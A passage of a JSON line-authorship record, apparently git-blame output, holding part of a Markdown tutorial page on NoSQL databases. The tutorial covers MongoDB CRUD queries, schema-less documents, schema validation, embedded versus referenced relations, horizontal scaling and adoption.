        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Note that while many NoSQL databases provide a JSON interface to interact with the data,"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "the underlying storage implementation may be different for performance reasons.\u003cbr\u003e"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, MongoDB stores documents in BSON (json encoded in binary). "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "## Key Characteristics of NoSQL Databases"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 1. Powerful and Simple CRUD Operations"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Interaction with most document databases is achieved in a simple and intuitive _object oriented manner_,"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "and JSON-like queries."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Let\u0027s get back to the above [example](#main-example) of an e-commerce website. To register a new user account,"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "an example insert operation made in mongoDB would be like so:"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "db.customers.insertOne({"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  username: \"panda\","
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  password: hashedPassword,"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  email: \"panda@pandas.com\""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "})"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Like relational databases, queries in NoSQL databases often also support more specific and powerful variants, and can"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "be even more succinct in some cases."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, to filter through items with a price of less than 30, and a popularity of more than 8,"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "thereafter sorting them by their price, you would make a query in MongoDB like so, intuitively matching"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "the structure of a typical item in the _items_ collection."
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "db.items.find({"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  price: {"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    $lt: 30"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  popularity: {"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    $gt: 8"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  }"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}).sort({"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  price: 1 // Here 1 means ascending order"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "})"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 2. Schema-Less Data"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Another key characteristic of most NoSQL databases is that they are **schema-less**."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In document databases for example, this means that each individual document has no restriction on what keys it must have,"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "the number of keys, the type of values and so on."
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cmodal header\u003d\"Example items collection of an e-commerce website\" id\u003d\"schemaless-example-modal\"\u003e"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cinclude src\u003d\"NoSQL.md#schemaless-example\" /\u003e"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/modal\u003e"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Note the missing fields for the second item in the \u003cem\u003eitems\u003c/em\u003e collection"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctrigger for\u003d\"schemaless-example-modal\"\u003eearlier,\u003c/trigger\u003e"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "which are intentionally omitted."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cdiv class\u003d\"mt-2\"\u003e"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "All purchase items, regardless of their types and their fields, can still be contained in a \u003cem\u003esingular\u003c/em\u003e collection."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This is an example of how a schema-less architecture can greatly simplify the organisation of data.\u003c/div\u003e"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Documents can even contain other documents, arrays, and depending on the implementation, likely anything the database can serialize and deserialize."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "At the same time, NoSQL databases usually also provide some form of optional"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cpopover header\u003d\"Schema Validation\" content\u003d\"A way to enforce some structure on data, and the corresponding operations on that data.\"\u003e"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cstrong\u003eschema validation\u003c/strong\u003e."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/popover\u003e"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, in the _customers_ collection, where the fields of a customer are unlikely to"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "change, it can be especially helpful to enforce a strict schema on documents; "
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This would prevent the unsuspecting programmer"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "from say, deleting a customer\u0027s password, which would be rather undesirable."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "// Example schema validation options in mongoDB"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "$jsonSchema: {"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  bsonType: \"object\","
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  require: [ \"username\", \"password\", \"email\" ]"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  properties: {"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  }"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 3. Straightforward Expression of Relations in Data"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "The world is full of relations. For example, a patient _is related to_ her disease record,"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "just as a customer _is related to_ their shopping cart."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Sometimes, the objects on both sides of the relation can contain substantial amounts of"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "information, and may be impossible to store as a singular field in one or the other document."
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Hence, simple relations such as"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctooltip content\u003d\"A type of relation where each item is only related to one other item\"\u003e"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "_one-to-one_"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/tooltip\u003e"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "relations,"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctooltip content\u003d\"A type of relation where each item can be related to many other items, but these other items are only ever related to one item on the other end\"\u003e"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "_one-to-many_"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/tooltip\u003e"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "relations are often expressed in document databases simply in the form of embedded documents, which is made possible due to "
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "the schema-less characteristic of NoSQL databases."
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, for a customer and his / her shopping cart, we may have the following:"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  username: \"panda\","
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  cart: {"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    totalPrice: 100,"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    cartItems: [ ... ],"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    discountCode: \"panda\""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  email: \"panda@pandas.com\","
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  ..."
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In the case of more complicated"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctooltip content\u003d\"A type of relation where each item can be related to many other items, and these other items can also be related to many items on the other end\"\u003e"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "_many-to-many_"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/tooltip\u003e"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "relationships, relations are commonly stored using references, to avoid duplication of data."
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, items in an e-commerce website are related to the many customers through their carts."
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In these carts, it is much more space efficient to store references to the items, than the item documents themselves."
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In this example, the uniquely generated `_id` field for each item document in the items collection could be one such _reference_:"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "{"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  type: \"book\","
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  price: 20,"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  popularity: 9.7,"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  _id: \"9d1793bd491349n913847n93d\""
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In the user\u0027s cart, we would simply store these `_id` _references_, which are used to lookup the item documents in the items collection later:"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "cart: {"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  totalPrice: 100,"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  cartItems: ["
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    \"9d1793bd491349n913847n93d\","
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    \"9d1793bd491349n913847njh8\","
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  ],"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  discountCode: \"panda\""
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "}"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"info\" light\u003e"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For this reason, many NoSQL database solutions (eg. MongoDB) implement a unique \u003ccode\u003eid\u003c/code\u003e field"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "for each document by default."
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "---"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "## Why NoSQL?"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 1. Highly Suited for Iterated Development"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Although less mature than relational databases, NoSQL databases were designed to solve many of the emerging challenges in databases today."
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "One of the most consequential impacts NoSQL has had was enabling faster iterated development."
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Given the highly flexible relational structure of NoSQL databases, and the schemaless format of documents "
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "in NoSQL, this means that developers can adapt the database quicker to changing customer and business requirements."
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "In contrast, tables in relational databases necessitate predefined schema, which can be rather difficult to change later on while ensuring there are no side effects."
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 2. Easy Horizontal Scaling"
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Another key benefit of NoSQL databases is the ability to scale horizontally (distributing workload across"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "multiple servers), without discarding much of its key features."
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This is largely due to the schema-less architecture of such databases, allowing data to split across"
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "multiple servers easily and efficiently."
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "For example, take the following collection of items with a `title`:"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```js"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "["
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  {"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    title: \"Apple\","
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  {"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    title: \"Orange\","
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  },"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "  ..."
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "]"
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "```"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "Assuming we don\u0027t have relations from items to themselves inside these documents,"
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "we can split the collection like so:"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cimg src\u003d\"horizontalScalability.png\" width\u003d\"70%\" class\u003d\"d-block mx-auto my-1\" /\u003e"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "As a result, the database access workload can be distributed evenly and efficiently across"
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "multiple servers easily."
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbox type\u003d\"success\" light\u003e"
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "As businesses grow, it is crucial that its databases can scale to meet greater consumer and business demands."
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cdiv\u003e"
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003ctooltip content\u003d\"increasing the processing power of the machine\"\u003eVertical scaling\u003c/tooltip\u003e can only go so far until the single machine hits its limit.\u003c/div\u003e"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "### 3. Widespread Adoption"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cfigure\u003e"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cimg src\u003d\"databaseSurvey.png\" width\u003d\"100%\" class\u003d\"d-block mx-auto\" /\u003e"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cfigcaption\u003e"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003csmall\u003eMost popular database technologies, as ranked by \u003ca href\u003d\"https://www.db-engines.com/en/ranking\"\u003edb-engines.com\u003c/a\u003e\u003c/small\u003e"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/figcaption\u003e"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003c/figure\u003e"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "While certainly trending behind relational databases, NoSQL databases have been \u003ctooltip content\u003d\"Amazon uses a proprietary NoSQL database!\"\u003ebooming\u003c/tooltip\u003e over the past couple of years,"
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "due to the increasing applicability of its benefits to requirements today. "
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "This bodes well for the maturity and development of this evolving technology, and your potential use cases for it."
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": ""
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "ang-zeyu"
        },
        "content": "---"
      },
      {
